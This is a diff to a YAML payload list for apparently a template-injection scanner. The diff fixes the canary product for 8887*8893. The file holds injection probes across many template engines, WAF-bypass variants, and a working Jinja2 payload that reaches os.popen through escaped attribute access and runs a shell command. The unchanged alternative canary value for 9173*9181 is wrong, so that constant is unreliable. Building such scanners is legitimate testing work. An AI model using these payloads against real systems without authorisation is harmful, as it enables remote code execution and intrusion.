@@ -6,7 +6,7 @@
 #   - Distinct across engines so the result uniquely identifies evaluation
 #
 # Products used:
-#   8887 * 8893 = 79,014,691   — two large primes, product unique
+#   8887 * 8893 = 79,032,091   — two large primes, product unique
 #   9173 * 9181 = 84,232,313   — two large primes, alternative canary
 #
 # Detection rule: look for the exact product as an isolated integer.
@@ -17,29 +17,29 @@ payloads:
   detection:
     # Jinja2 / Twig / Smarty / Pebble
     - payload: "{{8887*8893}}"
-      expected: "79014691"
+      expected: "79032091"
       engines: [jinja2, twig, smarty, pebble]
     # Freemarker / EL / Thymeleaf
     - payload: "${8887*8893}"
-      expected: "79014691"
+      expected: "79032091"
       engines: [freemarker, el, thymeleaf]
     # ERB / EJS
     - payload: "<%= 8887*8893 %>"
-      expected: "79014691"
+      expected: "79032091"
       engines: [erb, ejs]
     # Ruby string interpolation
     - payload: '#{8887*8893}'
-      expected: "79014691"
+      expected: "79032091"
       engines: [ruby_string_interpolation]
     # Spring EL
     - payload: "*{8887*8893}"
-      expected: "79014691"
+      expected: "79032091"
       engines: [spring_el]
     # Jinja2 string-repeat trick — distinguishes jinja2 from twig
     # Jinja2: "7" * 9173 repeats the string → "77777..." (9173 chars)
     # Twig:   "7" * 9173 = 64211 (numeric multiply)
     - payload: "{{8887*'8893'}}"
-      expected: "79014691"
+      expected: "79032091"
       engines: [twig]
     - payload: "{{9173*9181}}"
       expected: "84232313"
@@ -49,28 +49,28 @@ payloads:
     # WAF bypass variants — same canary product, different syntax
     # Whitespace between operands
     - payload: "{{ 8887 * 8893 }}"
-      expected: "79014691"
+      expected: "79032091"
     # Set + print
     - payload: "{% set x=8887*8893 %}{{x}}"
-      expected: "79014691"
+      expected: "79032091"
     # Negative double-negative
     - payload: "{{-8887*-8893}}"
-      expected: "79014691"
+      expected: "79032091"
     # Newline smuggling past single-line regex filters
     - payload: "{{\n8887*8893\n}}"
-      expected: "79014691"
+      expected: "79032091"
     # Freemarker alternative syntax
     - payload: "[=8887*8893]"
-      expected: "79014691"
+      expected: "79032091"
     # Velocity
     - payload: "#set($x=8887*8893)$x"
-      expected: "79014691"
+      expected: "79032091"
     # Pebble raw block bypass
     - payload: "{% raw %}{{8887*8893}}{% endraw %} and {{8887*8893}}"
-      expected: "79014691"
+      expected: "79032091"
     # Freemarker dollar-paren
     - payload: "${8887*8893}"
-      expected: "79014691"
+      expected: "79032091"
     # Blind via attribute access (harder for WAFs) — LLM validates result
     - payload: "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
       expected: null  # blind detection — LLM validates
